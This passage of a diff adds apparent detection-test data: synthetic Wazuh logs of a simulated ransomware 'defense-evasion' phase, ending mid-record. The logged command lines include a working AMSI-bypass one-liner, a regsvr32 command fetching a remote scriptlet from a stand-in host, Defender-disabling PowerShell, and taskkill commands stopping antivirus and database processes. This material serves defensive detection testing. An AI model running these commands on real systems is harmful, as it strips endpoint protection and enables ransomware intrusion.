@@ -1,0 +1,1278 @@
+{
+  "_metadata": {
+    "engagement": "ransomware",
+    "phase": "defense-evasion",
+    "phase_number": 4,
+    "description": "Defense Evasion phase of Ransomware - example-corp",
+    "techniques": [
+      "T1218.011",
+      "T1562.001",
+      "T1218.010"
+    ],
+    "timespan": "T+0:48:00 to T+6:21:00",
+    "attacker_logic": "Attacker executes defense-evasion techniques",
+    "format": "wazuh-native",
+    "format_version": "2.0"
+  },
+  "attacker_profile": {
+    "c2_server": "185.141.27.98",
+    "initial_target": "WS01.corp.local",
+    "compromised_user": "CORP\\jsmith"
+  },
+  "logs": [
+    {
+      "_comment": "AMSI bypass attempt",
+      "sequence": 1,
+      "relative_time": "T+0:48:00",
+      "timestamp": "2026-01-30T08:48:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-PowerShell/Operational",
+          "event_id": 4104,
+          "provider_name": "Microsoft-Windows-PowerShell",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "MessageNumber": "1",
+            "MessageTotal": "1",
+            "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+            "ScriptBlockId": "{C257A465-WS01-0008-5D4E815528B7}",
+            "Path": ""
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T08:48:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Rundll32 DLL execution",
+      "sequence": 2,
+      "relative_time": "T+0:49:00",
+      "timestamp": "2026-01-30T08:49:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:57:18.254",
+            "ProcessGuid": "{C257A465-WS01-0037-6D35DAF8AF6C}",
+            "ProcessId": "4715",
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "rundll32.exe C:\\Users\\Public\\payload.dll,DllMain",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "High",
+            "ParentProcessGuid": "{C257A465-WS01-0034-71BAC770B7F6}",
+            "ParentProcessId": "4492",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T08:49:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Regsvr32 Squiblydoo attack",
+      "sequence": 3,
+      "relative_time": "T+0:50:30",
+      "timestamp": "2026-01-30T08:50:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:57:24.370",
+            "ProcessGuid": "{C257A465-WS01-0038-B1DEB77346AD}",
+            "ProcessId": "4855",
+            "Image": "C:\\Windows\\System32\\regsvr32.exe",
+            "CommandLine": "regsvr32 /s /n /u /i:http://update-cdn.example.com/payload.sct scrobj.dll",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "Medium",
+            "ParentProcessGuid": "{C257A465-WS01-0037-6D35DAF8AF6C}",
+            "ParentProcessId": "4715",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T08:50:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Disable Windows Defender (Sysmon)",
+      "sequence": 4,
+      "relative_time": "T+0:52:30",
+      "timestamp": "2026-01-30T08:52:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:57:26.787",
+            "ProcessGuid": "{C257A465-WS01-0039-7009B0D57E40}",
+            "ProcessId": "4944",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true\"",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+            "ParentProcessGuid": "{C257A465-WS01-0038-B1DEB77346AD}",
+            "ParentProcessId": "4855",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T08:52:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Disable Windows Defender (Security)",
+      "sequence": 5,
+      "relative_time": "T+0:55:00",
+      "timestamp": "2026-01-30T08:55:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
+            "SubjectUserName": "jsmith",
+            "SubjectDomainName": "EXAMPLE",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1350",
+            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "TokenElevationType": "%%1937",
+            "ProcessId": "0x12F7",
+            "CommandLine": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true\"",
+            "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
+            "TargetUserName": "jsmith",
+            "TargetDomainName": "EXAMPLE",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-12288"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T08:55:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Disable Windows Defender (PowerShell ScriptBlock)",
+      "sequence": 6,
+      "relative_time": "T+0:58:00",
+      "timestamp": "2026-01-30T08:58:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-PowerShell/Operational",
+          "event_id": 4104,
+          "provider_name": "Microsoft-Windows-PowerShell",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "MessageNumber": "1",
+            "MessageTotal": "1",
+            "ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true",
+            "ScriptBlockId": "{C257A465-WS01-0039-7009B0D57E40}",
+            "Path": ""
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T08:58:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Disable Windows Defender (Sysmon)",
+      "sequence": 7,
+      "relative_time": "T+1:01:30",
+      "timestamp": "2026-01-30T09:01:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:57:46.846",
+            "ProcessGuid": "{C257A465-DC01-0040-1DE462D18ED8}",
+            "ProcessId": "5062",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true\"",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\mjones",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+            "ParentProcessGuid": "{C257A465-DC01-0036-8E4FAA7ABD0A}",
+            "ParentProcessId": "4616",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T09:01:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Disable Windows Defender (Security)",
+      "sequence": 8,
+      "relative_time": "T+1:05:30",
+      "timestamp": "2026-01-30T09:05:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
+            "SubjectUserName": "mjones",
+            "SubjectDomainName": "EXAMPLE",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x13C6",
+            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "TokenElevationType": "%%1937",
+            "ProcessId": "0x1208",
+            "CommandLine": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true\"",
+            "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
+            "TargetUserName": "mjones",
+            "TargetDomainName": "EXAMPLE",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-12288"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T09:05:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Disable Windows Defender (PowerShell ScriptBlock)",
+      "sequence": 9,
+      "relative_time": "T+1:10:00",
+      "timestamp": "2026-01-30T09:10:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-PowerShell/Operational",
+          "event_id": 4104,
+          "provider_name": "Microsoft-Windows-PowerShell",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "MessageNumber": "1",
+            "MessageTotal": "1",
+            "ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true",
+            "ScriptBlockId": "{C257A465-DC01-0040-1DE462D18ED8}",
+            "Path": ""
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T09:10:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Disable Windows Defender (Sysmon)",
+      "sequence": 10,
+      "relative_time": "T+1:15:00",
+      "timestamp": "2026-01-30T09:15:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 11:58:02.142",
+            "ProcessGuid": "{C257A465-FS01-0041-60E9928E7B23}",
+            "ProcessId": "5196",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true\"",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "EXAMPLE\\jsmith",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+            "ParentProcessGuid": null,
+            "ParentProcessId": "",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T09:15:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Disable Windows Defender (Security)",
+      "sequence": 11,
+      "relative_time": "T+1:20:30",
+      "timestamp": "2026-01-30T09:20:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
+            "SubjectUserName": "jsmith",
+            "SubjectDomainName": "EXAMPLE",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x144C",
+            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "TokenElevationType": "%%1937",
+            "ProcessId": "0x0",
+            "CommandLine": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true\"",
+            "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
+            "TargetUserName": "jsmith",
+            "TargetDomainName": "EXAMPLE",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-12288"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T09:20:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Disable Windows Defender (PowerShell ScriptBlock)",
+      "sequence": 12,
+      "relative_time": "T+1:26:30",
+      "timestamp": "2026-01-30T09:26:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-PowerShell/Operational",
+          "event_id": 4104,
+          "provider_name": "Microsoft-Windows-PowerShell",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "MessageNumber": "1",
+            "MessageTotal": "1",
+            "ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true",
+            "ScriptBlockId": "{C257A465-FS01-0041-60E9928E7B23}",
+            "Path": ""
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-30T09:26:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: msmpeng.exe",
+      "sequence": 13,
+      "relative_time": "T+1:33:00",
+      "timestamp": "2026-01-30T09:33:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:34.539",
+            "ProcessGuid": "{C257A465-WS01-0051-F2476891B7EB}",
+            "ProcessId": "6126",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im msmpeng.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ParentProcessId": "6012",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T09:33:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: savservice.exe",
+      "sequence": 14,
+      "relative_time": "T+1:40:00",
+      "timestamp": "2026-01-30T09:40:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:34.539",
+            "ProcessGuid": "{C257A465-WS01-0051-F2476891B7EB}",
+            "ProcessId": "6126",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im savservice.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ParentProcessId": "6012",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T09:40:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: ccsvchst.exe",
+      "sequence": 15,
+      "relative_time": "T+1:47:30",
+      "timestamp": "2026-01-30T09:47:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:34.539",
+            "ProcessGuid": "{C257A465-WS01-0051-F2476891B7EB}",
+            "ProcessId": "6126",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im ccsvchst.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ParentProcessId": "6012",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T09:47:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: avgnt.exe",
+      "sequence": 16,
+      "relative_time": "T+1:55:30",
+      "timestamp": "2026-01-30T09:55:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:34.539",
+            "ProcessGuid": "{C257A465-WS01-0051-F2476891B7EB}",
+            "ProcessId": "6126",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im avgnt.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ParentProcessId": "6012",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T09:55:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: avastsvc.exe",
+      "sequence": 17,
+      "relative_time": "T+2:04:00",
+      "timestamp": "2026-01-30T10:04:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:34.539",
+            "ProcessGuid": "{C257A465-WS01-0051-F2476891B7EB}",
+            "ProcessId": "6126",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im avastsvc.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ParentProcessId": "6012",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T10:04:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: sqlservr.exe",
+      "sequence": 18,
+      "relative_time": "T+2:13:00",
+      "timestamp": "2026-01-30T10:13:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:34.539",
+            "ProcessGuid": "{C257A465-WS01-0051-F2476891B7EB}",
+            "ProcessId": "6126",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im sqlservr.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ParentProcessId": "6012",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T10:13:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: oracle.exe",
+      "sequence": 19,
+      "relative_time": "T+2:22:30",
+      "timestamp": "2026-01-30T10:22:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:34.539",
+            "ProcessGuid": "{C257A465-WS01-0051-F2476891B7EB}",
+            "ProcessId": "6126",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im oracle.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ParentProcessId": "6012",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T10:22:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: vmware-vmx.exe",
+      "sequence": 20,
+      "relative_time": "T+2:32:30",
+      "timestamp": "2026-01-30T10:32:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "WORKSTATION01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:06:34.539",
+            "ProcessGuid": "{C257A465-WS01-0051-F2476891B7EB}",
+            "ProcessId": "6126",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im vmware-vmx.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-WS01-0050-6D56D9E21399}",
+            "ParentProcessId": "6012",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "WS01",
+          "id": "007"
+        },
+        "timestamp": "2026-01-30T10:32:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: msmpeng.exe",
+      "sequence": 21,
+      "relative_time": "T+2:43:00",
+      "timestamp": "2026-01-30T10:43:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:09:35.683",
+            "ProcessGuid": "{C257A465-DC01-0059-C1B45DA47DC5}",
+            "ProcessId": "6938",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im msmpeng.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ParentProcessId": "6821",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T10:43:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: savservice.exe",
+      "sequence": 22,
+      "relative_time": "T+2:54:00",
+      "timestamp": "2026-01-30T10:54:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:09:35.683",
+            "ProcessGuid": "{C257A465-DC01-0059-C1B45DA47DC5}",
+            "ProcessId": "6938",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im savservice.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ParentProcessId": "6821",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T10:54:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: ccsvchst.exe",
+      "sequence": 23,
+      "relative_time": "T+3:05:30",
+      "timestamp": "2026-01-30T11:05:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:09:35.683",
+            "ProcessGuid": "{C257A465-DC01-0059-C1B45DA47DC5}",
+            "ProcessId": "6938",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im ccsvchst.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ParentProcessId": "6821",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "DC01",
+          "id": "003"
+        },
+        "timestamp": "2026-01-30T11:05:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "defense-evasion"
+      }
+    },
+    {
+      "_comment": "Kill process: avgnt.exe",
+      "sequence": 24,
+      "relative_time": "T+3:17:30",
+      "timestamp": "2026-01-30T11:17:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "DC01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:09:35.683",
+            "ProcessGuid": "{C257A465-DC01-0059-C1B45DA47DC5}",
+            "ProcessId": "6938",
+            "Image": "C:\\Windows\\System32\\taskkill.exe",
+            "CommandLine": "taskkill /f /im avgnt.exe",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-DC01-0058-C5B67F4F8F92}",
+            "ParentProcessId": "6821",
